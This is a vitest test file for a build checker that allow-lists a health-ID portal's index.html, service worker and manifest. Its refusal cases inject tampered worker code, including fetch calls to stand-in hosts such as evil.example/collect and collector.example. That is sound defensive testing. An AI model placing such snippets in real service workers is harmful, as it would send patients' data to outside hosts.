// @vitest-environment node
import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'

/**
 * hid-system's staging step (infra/cloudflare/scripts/health-id-artifact.mjs,
 * `inspectIndexHtml`) allow-lists the portal's index.html: a doctype, html,
 * head, meta charset or a meta named viewport or robots, a title, one module
 * entry script and modulepreload or stylesheet links from the build's own
 * /assets/, comments, and a body with the root div. Anything else refuses the
 * build for every host and environment, so www and admin cannot be staged.
 * Health-id #60 added `<meta name="theme-color">`, which it refuses, and
 * `audit:launch-build` did not check the shell, so it passed.
 *
 * Since the Health ID icon was added (hid-1.0 parity, 2026-10-28) the check is
 * that copy widened by exactly the icon files in apps/patient-web/public, the
 * shell's links to them and a #rrggbb theme-color (check-launch-build.mjs).
 * Since B6 (phone and computer notifications) it accepts exactly one service
 * worker, public/sw.js, which only shows a fixed notification and opens
 * Notifications, registered only by pushDevice's chunk; every other worker,
 * and a sw.js that does more, is still refused. Since the offline app shell
 * (docs/OFFLINE-CONTRACT.md 2.12-2.13, A5) the same sw.js may also keep the
 * build's own files in health-id-shell- caches and handle navigations and
 * those files, and the shell's chunk may register it too; the refusals that
 * replace "no fetch, no Cache API" are below.
 */
const repository = fileURLToPath(new URL('../../../..', import.meta.url))
const script = join(repository, 'scripts', 'check-launch-build.mjs')
const sourceShell = readFileSync(join(repository, 'apps', 'patient-web', 'index.html'), 'utf8')
const publicFiles = join(repository, 'apps', 'patient-web', 'public')

const ENTRY = 'assets/index-AbCdEf12.js'
const STYLE = 'assets/index-GhIjKl34.css'
const SOURCE_ENTRY = '<script type="module" src="/src/main.tsx"></script>'

/** The shell as Vite writes it: the source entry swapped for the hashed bundle, with its stylesheet. */
function asBuilt(html: string): string {
  expect(html).toContain(SOURCE_ENTRY)
  return html.replace(SOURCE_ENTRY, '').replace('</head>',
    `  <script type="module" crossorigin src="/${ENTRY}"></script>\n`
    + `    <link rel="stylesheet" crossorigin href="/${STYLE}">\n  </head>`)
}

/**
 * Runs `npm run audit:launch-build` over a build holding this index.html, two hashed assets and, as Vite copies them,
 * the files in apps/patient-web/public; `files` adds or replaces files in it.
 */
function launchBuildCheck(html: string, files: Record<string, string> = {}, env: Record<string, string> = {}): { status: number | null; output: string } {
  const root = mkdtempSync(join(tmpdir(), 'hid-launch-shell-'))
  try {
    const dist = join(root, 'apps', 'patient-web', 'dist')
    mkdirSync(join(dist, 'assets'), { recursive: true })
    cpSync(publicFiles, dist, { recursive: true })
    writeFileSync(join(dist, 'index.html'), html)
    writeFileSync(join(dist, ENTRY), 'document.title = document.title\n')
    writeFileSync(join(dist, STYLE), 'body{margin:0}\n')
    for (const [path, content] of Object.entries(files)) {
      mkdirSync(join(dist, path, '..'), { recursive: true })
      writeFileSync(join(dist, path), content)
    }
    const inherited = Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith('VITE_')))
    const result = spawnSync(process.execPath, [script], { cwd: root, encoding: 'utf8', env: { ...inherited, ...env } })
    return { status: result.status, output: `${result.stdout}${result.stderr}` }
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
}

const built = asBuilt(sourceShell)

describe('the portal shell staging accepts', () => {
  it('has only the meta tags the check accepts: a charset, a viewport or robots name, or a #rrggbb theme-color', () => {
    const metas = sourceShell.match(/<meta\b[^>]*>/gi) ?? []
    expect(metas.length).toBeGreaterThan(0)
    for (const meta of metas) {
      expect(meta).toMatch(/^<meta\s+(?:charset="utf-8"|name="(?:viewport|robots)"\s+content="[^"<>]*"|name="theme-color"\s+content="#[0-9a-f]{6}")\s*\/?>$/i)
    }
  })

  it('passes the launch build check as Vite builds it', () => {
    const result = launchBuildCheck(built)
    expect(result.output).not.toMatch(/failed/)
    expect(result.status).toBe(0)
  })
})

describe('the launch build check refuses a shell staging refuses', () => {
  it.each([
    ['a theme-color that is not a colour', built.replace('content="#086dd9"', 'content="url(https://evil.example/)"'), /theme-color/],
    ['a web app manifest linked from another file', built.replace('href="/health-id.webmanifest"', 'href="/manifest.json"'), /as manifest/],
    ['an icon from another origin', built.replace('href="/icons/icon-48.png"', 'href="https://cdn.example.test/icon.png"'), /as icon/],
    ['an icon linked as the manifest', built.replace('href="/health-id.webmanifest"', 'href="/icons/icon-48.png"'), /as manifest/],
    ['an inline script', built.replace('<title>', '<script>window.x = 1</script>\n    <title>'), /inline script/],
    ['a script from another origin', built.replace(`src="/${ENTRY}"`, 'src="https://cdn.example.test/app.js"'),
      /outside its own \/assets\//],
    ['an element outside the shell', built.replace('<title>', '<base href="/">\n    <title>'), /<base>/],
    ['no doctype', built.replace('<!doctype html>', ''), /doctype/],
  ])('%s', (_name, html, reason) => {
    const result = launchBuildCheck(html)
    expect(result.status).toBe(1)
    expect(result.output).toMatch(reason)
  })
})

const PUSH_WORKER = readFileSync(join(publicFiles, 'sw.js'), 'utf8')
// What Vite makes of apps/patient-web/src/pushDevice.ts, minified as it is: the one chunk allowed the worker API.
const PUSH_DEVICE_CHUNK = 'assets/pushDevice-Qr5tUv78.js'
const PUSH_DEVICE = 'async function t(){return"serviceWorker"in navigator?navigator.serviceWorker.getRegistration("/"):void 0}'
  + 'async function r(){await navigator.serviceWorker.register("/sw.js",{scope:"/",updateViaCache:"none"});return navigator.serviceWorker.ready}export{t,r};\n'
/** The real sw.js with `extra` added after its listeners. */
const workerWith = (extra: string) => `${PUSH_WORKER}\n${extra}\n`
/** The real sw.js as a pilot build writes it (vite.config.ts): the shell's file list in place of null. */
const withShell = (assets: string[], extra: Record<string, unknown> = {}) => PUSH_WORKER.replace('self.__HID_SHELL__ = null',
  `self.__HID_SHELL__ = ${JSON.stringify({ build: '0123456789abcdef', environment: 'production', debug: false, entry: `/${ENTRY}`, assets, ...extra })}`)
// What Vite makes of apps/patient-web/src/offline/shell.ts: the other chunk allowed the worker API.
const SHELL_CHUNK = 'assets/shell-Ab12Cd34.js'
const SHELL_CODE = 'async function n(){const e=navigator.serviceWorker;const t=await e.register("/sw.js",{scope:"/",updateViaCache:"none"});'
  + 't.active?.postMessage({type:"HID_SHELL_ENABLE"})}export{n};\n'

describe('the push worker (B6)', () => {
  it('accepts the real public files with pushDevice\'s chunk, the only code that registers it', () => {
    const result = launchBuildCheck(built, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE })
    expect(result.output).not.toMatch(/failed/)
    expect(result.status).toBe(0)
  })

  it('accepts a pilot build: the shell\'s file list naming the build\'s own files, and the shell\'s chunk registering /sw.js', () => {
    const result = launchBuildCheck(built, {
      [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, [SHELL_CHUNK]: SHELL_CODE,
      'sw.js': withShell([`/${ENTRY}`, `/${STYLE}`, `/${PUSH_DEVICE_CHUNK}`, `/${SHELL_CHUNK}`, '/health-id.webmanifest', '/icons/icon-192.png']),
    })
    expect(result.output).not.toMatch(/failed/)
    expect(result.status).toBe(0)
  })

  it('accepts a staging build with the debug panel on', () => {
    const result = launchBuildCheck(built, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, 'sw.js': withShell([`/${ENTRY}`], { environment: 'staging', debug: true }) })
    expect(result.status).toBe(0)
  })

  it('refuses any build made with the offline debug panel on for production', () => {
    const result = launchBuildCheck(built, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE }, { VITE_HID_ENVIRONMENT: 'production', VITE_HID_OFFLINE_DEBUG: 'true' })
    expect(result.status).toBe(1)
    expect(result.output).toMatch(/turns the offline debug panel on for production/)
  })

  it.each([
    ['an onfetch handler', { 'sw.js': workerWith('self.onfetch = () => {}') }, /sw\.js handles requests through onfetch/],
    ['a cache named hid-', { 'sw.js': workerWith("self.addEventListener('activate', () => caches.open('hid-pages'))") },
      /opens a cache whose name does not start with health-id-shell-/],
    ['a cache name not built from the shell prefix', { 'sw.js': PUSH_WORKER.replace('caches.open(SHELL_PREFIX + SHELL.build)', "caches.open('pages')") },
      /opens a cache whose name does not start with health-id-shell-/],
    ['a listing of every cache', { 'sw.js': PUSH_WORKER.replace('.filter(name => name.startsWith(SHELL_PREFIX))', '') },
      /lists caches without keeping only health-id-shell- ones/],
    ['a read across every cache', { 'sw.js': PUSH_WORKER.replace('caches.match(path, { cacheName: name })', 'caches.match(path)') },
      /reads from the Cache API other than from one named shell cache/],
    ['caching an API answer', { 'sw.js': workerWith("self.addEventListener('message', event => event.waitUntil(caches.open(SHELL_PREFIX + 'x').then(c => c.add('/api/v1/identity/me'))))") },
      /names an \/api\/ path other than in its exclusion guard/],
    ['no exclusion guard for the API', { 'sw.js': PUSH_WORKER.replace("path.startsWith('/api/')", "path.startsWith('/a/')") },
      /lacks the startsWith\('\/api\/'\) guard/],
    ['saving the shell at install', { 'sw.js': PUSH_WORKER.replace("self.addEventListener('install', () => {})",
      "self.addEventListener('install', event => event.waitUntil(precacheShell()))") }, /does work at install/],
    ['an install listener that takes over at once', { 'sw.js': workerWith("self.addEventListener('install', () => self.skipWaiting())") },
      /takes over from the running worker other than when a page asks/],
    ['taking control of open pages', { 'sw.js': workerWith("self.addEventListener('activate', event => event.waitUntil(self.clients.claim()))") },
      /takes control of open pages/],
    ['an imported script', { 'sw.js': workerWith("importScripts('/assets/firebase-messaging.js')") }, /sw\.js imports scripts/],
    ['a read of the push\'s data', { 'sw.js': PUSH_WORKER.replace('self.registration.showNotification(TITLE, OPTIONS)',
      'self.registration.showNotification(event.data.json().title, OPTIONS)') }, /sw\.js reads a message's or push's data/],
    ['a read of a message\'s data beyond its type', { 'sw.js': PUSH_WORKER.replace('const type = event.data?.type', 'const type = event.data?.kind') },
      /sw\.js reads a message's or push's data/],
    ['a network request on a push', { 'sw.js': workerWith("self.addEventListener('push', () => self.fetch('/x'))") },
      /sw\.js uses the network or the Cache API on push/],
    ['IndexedDB', { 'sw.js': workerWith("self.addEventListener('message', () => self.indexedDB.open('hid'))") }, /sw\.js uses IndexedDB/],
    ['local storage', { 'sw.js': workerWith("self.addEventListener('message', () => self.localStorage)") }, /sw\.js uses localStorage/],
    ['another listener', { 'sw.js': workerWith("self.addEventListener('sync', () => {})") }, /sw\.js listens for sync/],
    ['no push listener', { 'sw.js': PUSH_WORKER.replace("addEventListener('push'", "addEventListener('notificationclose'") },
      /sw\.js does not listen for push/],
    ['a tap that opens somewhere else', { 'sw.js': PUSH_WORKER.replace("'/notifications'", "'/records'") },
      /does not open '\/notifications'/],
    ['a shell file list naming a file the build lacks', { 'sw.js': withShell(['/assets/index-AbCdEf12.js', '/assets/missing-ZzZzZz99.js']) },
      /would keep \/assets\/missing-ZzZzZz99\.js/],
    ['a shell file list naming a file outside the shell', { 'sw.js': withShell(['/index.html']) }, /would keep \/index\.html/],
    ['a production shell with the debug panel on', { 'sw.js': withShell([`/${ENTRY}`], { debug: true }) },
      /production build with the offline debug panel on/],
    ['a shell file list without the page\'s entry', { 'sw.js': withShell([`/${ENTRY}`], { entry: undefined }) },
      /not \{ build, environment, debug, entry, assets \}/],
    ['an entry that is not the built page\'s module script', { 'sw.js': withShell([`/${ENTRY}`, `/${STYLE}`], { entry: `/${STYLE}` }) },
      /names \/assets\/index-GhIjKl34\.css as the page's entry/],
    ['runtime caching under the shell prefix', { 'sw.js': withShell([`/${ENTRY}`]).replace("const navigation = request.mode === 'navigate'",
      "caches.open(SHELL_PREFIX + 'runtime').then(cache => cache.put(request, new Response('')))\n  const navigation = request.mode === 'navigate'") },
      /writes to the Cache API outside precacheShell/],
    ['a cross-origin fetch on a message', { 'sw.js': withShell([`/${ENTRY}`]).replace("event.waitUntil(purgeShell())",
      "event.waitUntil(purgeShell().then(() => fetch('https://evil.example/collect')))") }, /fetches other than/],
    ['a push listener that calls a helper doing more', { 'sw.js': PUSH_WORKER.replace('event.waitUntil(self.registration.showNotification(TITLE, OPTIONS))',
      'event.waitUntil(notify())').replace('const TARGET_PATH', 'async function notify() { await shellResponse(new Request(\'/\'), \'/\', true); '
      + 'return self.registration.showNotification(TITLE, OPTIONS) }\nconst TARGET_PATH') }, /push and tap listeners are not the ones B6 shipped/],
    ['an API branch that caches inside the guard', { 'sw.js': withShell([`/${ENTRY}`]).replace(
      "if (path === '/api' || path.startsWith('/api/') || path === '/sw.js' || path === '/service-worker.js') return",
      "if (path === '/api' || path.startsWith('/api/')) {\n    event.respondWith(fetch(request).then(answer => caches.open(SHELL_PREFIX + SHELL.build)"
      + ".then(cache => cache.put(request, answer.clone())).then(() => answer)))\n    return\n  }\n  if (path === '/sw.js' || path === '/service-worker.js') return") },
      /writes to the Cache API outside precacheShell|answers requests other than through shellResponse|fetches other than/],
    ['a page that preloads the shell\'s chunk', { [SHELL_CHUNK]: SHELL_CODE },
      /index\.html preloads assets\/shell-Ab12Cd34\.js/, built.replace('</head>', `  <link rel="modulepreload" crossorigin href="/${SHELL_CHUNK}">\n  </head>`)],
    ['a page that preloads pushDevice\'s chunk', {},
      /index\.html preloads assets\/pushDevice-Qr5tUv78\.js/, built.replace('</head>', `  <link rel="modulepreload" crossorigin href="/${PUSH_DEVICE_CHUNK}">\n  </head>`)],
    ['a chunk that imports the shell\'s chunk statically', { [SHELL_CHUNK]: SHELL_CODE, [ENTRY]: 'import{n as e}from"./shell-Ab12Cd34.js";e()\n' },
      /index-AbCdEf12\.js imports assets\/shell-Ab12Cd34\.js statically/],
    ['a second push listener answering a cross-origin request', { 'sw.js': workerWith(
      "self.addEventListener('push', event => event.waitUntil(shellResponse(new Request('https://evil.example/x'), '/x', false)))") },
      /listens for push other than once, in B6's pinned listeners/],
    ['shellResponse called from the message listener', { 'sw.js': withShell([`/${ENTRY}`]).replace('event.waitUntil(purgeShell())',
      "event.waitUntil(shellResponse(new Request('https://evil.example/'), '/', true))") },
      /calls shellResponse other than to answer the fetch event/],
    ['an aliased fetch', { 'sw.js': workerWith("const get = self.fetch\nself.addEventListener('message', () => get('https://evil.example/'))") },
      /refers to fetch other than by calling it/],
    ['the shell saved at worker start', { 'sw.js': `${withShell([`/${ENTRY}`])}\nif (SHELL) precacheShell()\n` },
      /saves the shell other than when a page asks/],
    ['the shell saved on a navigation', { 'sw.js': withShell([`/${ENTRY}`]).replace("const navigation = request.mode === 'navigate'",
      "const navigation = request.mode === 'navigate'\n  if (navigation) precacheShell()") }, /saves the shell other than when a page asks/],
    ['shellResponse called through .call from the message listener', { 'sw.js': withShell([`/${ENTRY}`]).replace('event.waitUntil(purgeShell())',
      "event.waitUntil(shellResponse.call(null, new Request('https://collector.example/' + type), '/', true))") },
      /sw\.js is not the reviewed public\/sw\.js/],
    ['the activate guard removed', { 'sw.js': withShell([`/${ENTRY}`]).replace('    if (!(await refreshShellKept())) return\n', '') },
      /sw\.js is not the reviewed public\/sw\.js/],
    ['a shell file list set twice', { 'sw.js': `${withShell([`/${ENTRY}`])}self.__HID_SHELL__ = null\n` }, /set self\.__HID_SHELL__ exactly once/],
    ['a worker anywhere but the root', { 'icons/sw.js': PUSH_WORKER }, /icons\/sw\.js is a service worker/],
    ['the worker API outside pushDevice\'s and the shell\'s chunks', { [ENTRY]: 'navigator.serviceWorker.register("/sw.js")\n' },
      /index-AbCdEf12\.js registers a service worker/],
    ['a chunk that registers another script', { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE.replace('"/sw.js"', '"/firebase-messaging-sw.js"') },
      /registers \/firebase-messaging-sw\.js; only \/sw\.js may be registered/],
    ['a chunk that registers a script it names at run time', { [PUSH_DEVICE_CHUNK]: `${PUSH_DEVICE}navigator.serviceWorker.register(e.url)\n` },
      /registers \(e\.url\); only \/sw\.js may be registered/],
    ['a shell chunk that registers another script', { [SHELL_CHUNK]: SHELL_CODE.replace('"/sw.js"', '"/offline-sw.js"') },
      /shell-Ab12Cd34\.js registers \/offline-sw\.js; only \/sw\.js may be registered/],
  ])('refuses %s', (_name, files, reason, html = built) => {
    const result = launchBuildCheck(html, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, ...files })
    expect(result.status).toBe(1)
    expect(result.output).toMatch(reason)
  })
})

describe('the reviewed worker pin', () => {
  it('is the SHA-256 of apps/patient-web/public/sw.js: a change to the worker updates the pin in the same commit', () => {
    const pinned = /const WORKER_SHA256 = '([0-9a-f]{64})'/.exec(readFileSync(script, 'utf8'))?.[1]
    expect(pinned).toBe(createHash('sha256').update(PUSH_WORKER).digest('hex'))
  })
})

describe('the launch build check refuses a build staging refuses', () => {
  const manifest = readFileSync(join(publicFiles, 'health-id.webmanifest'), 'utf8')
  it.each([
    ['another web app manifest', { 'manifest.json': '{}' }, /manifest\.json is a web app manifest other than health-id\.webmanifest/],
    ['a file outside assets/ that is not an icon file', { 'icons/extra.png': 'png' }, /icons\/extra\.png is outside the expected set/],
    ['a manifest that names a service worker', { 'health-id.webmanifest': JSON.stringify({ ...JSON.parse(manifest), serviceworker: { src: '/sw.js' } }) },
      /names a service worker/],
    ['a manifest icon from outside the build', { 'health-id.webmanifest': JSON.stringify({ ...JSON.parse(manifest), icons: [{ src: 'https://cdn.example.test/i.png' }] }) },
      /names an icon/],
    ['a service worker', { 'service-worker.js': 'self.skipWaiting()' }, /service-worker\.js is a service worker/],
    ['a Workbox worker', { 'workbox-1a2b3c4d.js': 'self.skipWaiting()' }, /workbox-1a2b3c4d\.js is a service worker/],
    ['a manifest that names a file other than its icons', { 'health-id.webmanifest': JSON.stringify({ ...JSON.parse(manifest),
      icons: [{ src: '/sw.js', sizes: '512x512', type: 'image/png' }] }) }, /names an icon \(\/sw\.js\)/],
  ])('%s', (_name, files, reason) => {
    const result = launchBuildCheck(built, files)
    expect(result.status).toBe(1)
    expect(result.output).toMatch(reason)
  })
})
